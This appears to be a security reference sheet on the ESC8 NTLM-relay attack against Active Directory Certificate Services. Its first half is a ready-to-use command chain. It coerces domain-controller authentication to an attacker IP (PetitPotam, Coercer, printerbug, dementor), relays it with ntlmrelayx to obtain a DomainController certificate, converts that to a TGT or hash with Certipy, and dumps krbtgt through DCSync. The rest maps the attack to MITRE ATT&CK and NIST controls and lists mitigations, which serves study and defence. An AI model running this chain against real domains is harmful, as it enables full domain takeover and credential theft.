# Relaying NTLM For Adcs Esc8

## API Reference

## Certipy (enumeration + abuse)

| Command | Purpose | Example |
|---------|---------|---------|
| `certipy find` | Enumerate CAs/templates; flag vulnerabilities | `certipy find -u u@corp.local -p pw -dc-ip 10.0.0.10 -vulnerable -enabled -stdout` |
| `certipy auth` | PKINIT with a .pfx -> TGT + NT hash | `certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10` |
| `certipy req` | Request a certificate from a template | `certipy req -u u@corp.local -ca CORP-CA -template DomainController` |

Useful `find` flags: `-vulnerable`, `-enabled`, `-stdout`, `-json`, `-dc-ip`, `-ns`.

## Impacket ntlmrelayx (relay engine)

| Flag | Purpose |
|------|---------|
| `-t <url>` | Target to relay to (e.g. `http://ca/certsrv/certfnsh.asp`) |
| `-tf <file>` | File of multiple relay targets |
| `--adcs` | Enable AD CS relay attack (request certificate) |
| `--template <name>` | Certificate template (`DomainController`, `Machine`, `User`) |
| `-smb2support` | Accept SMB2 connections from coerced auth |
| `-socks` | Hold relayed sessions in a SOCKS proxy |
| `-i` | Drop to an interactive SMB/LDAP shell |
| `--no-http-server` / `--no-smb-server` | Disable specific relay servers |

```bash
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

## Coercion Tools

| Tool | Protocol | Example |
|------|----------|---------|
| PetitPotam | MS-EFSRPC | `python3 PetitPotam.py -u u -p pw -d corp.local <attacker_ip> <dc_ip>` |
| Coercer | Multi-protocol | `coercer coerce -u u -p pw -d corp.local -l <attacker_ip> -t <dc_ip>` |
| printerbug.py | MS-RPRN | `python3 printerbug.py corp.local/u:pw@<dc_ip> <attacker_ip>` |
| dementor.py | MS-RPRN | `python3 dementor.py <attacker_ip> <dc_ip> -u u -p pw -d corp.local` |

## Post-Exploitation

| Command | Purpose | Example |
|---------|---------|---------|
| `impacket-secretsdump` | DCSync with TGT/hash | `KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01 -just-dc-user krbtgt` |
| `impacket-getTGT` | Request TGT from hash | `impacket-getTGT corp.local/'DC01$' -hashes :<NTHASH>` |

## Web Enrollment Endpoints (relay targets)

| Endpoint | Notes |
|----------|-------|
| `/certsrv/certfnsh.asp` | Certificate submission page (primary ESC8 target) |
| `/certsrv/` | Web Enrollment root |
| `/ADPolicyProvider_CEP_Kerberos/service.svc` | CES/CEP (ESC11-related) |

## External References

- Impacket: https://github.com/fortra/impacket
- Certipy wiki: https://github.com/ly4k/Certipy/wiki
- HackingArticles ESC8: https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/

---

## Standards and Controls

## NIST CSF 2.0

| ID | Name | Rationale |
|----|------|-----------|
| DE.CM-01 | Networks and network services are monitored to find potentially adverse events | ESC8 produces detectable network signals: forced authentication (coercion), NTLM relay to the AD CS HTTP endpoint, and anomalous machine-account certificate enrollment. |

## MITRE ATT&CK

| Technique ID | Name | Tactic | Rationale |
|--------------|------|--------|-----------|
| T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Credential Access / Collection | Core ESC8 primitive — relaying coerced NTLM auth to AD CS web enrollment. |
| T1187 | Forced Authentication | Credential Access | PetitPotam/printerbug coerce the DC to authenticate. |
| T1649 | Steal or Forge Authentication Certificates | Credential Access | The attack yields a DC machine-account certificate. |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access | The recovered DC identity enables DCSync. |

## Supporting Frameworks and Standards

- **MS-EFSRPC** — protocol abused by PetitPotam for coercion.
- **MS-RPRN** — Print System Remote Protocol abused by printerbug.py.
- **MS-WCCE** — Windows Client Certificate Enrollment, the target enrollment protocol.
- **Microsoft KB5005413 / ADV210003** — mitigations for NTLM relay to AD CS (EPA, disable NTLM on enrollment).
- **D3FEND** — Certificate-based authentication hardening and network traffic analysis as countermeasures.

## Official Resources

- Impacket: https://github.com/fortra/impacket
- Certipy: https://github.com/ly4k/Certipy
- PetitPotam: https://github.com/topotam/PetitPotam
- Coercer: https://github.com/p0dalirius/Coercer
- Certified Pre-Owned: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- dirkjanm "NTLM relaying to AD CS": https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
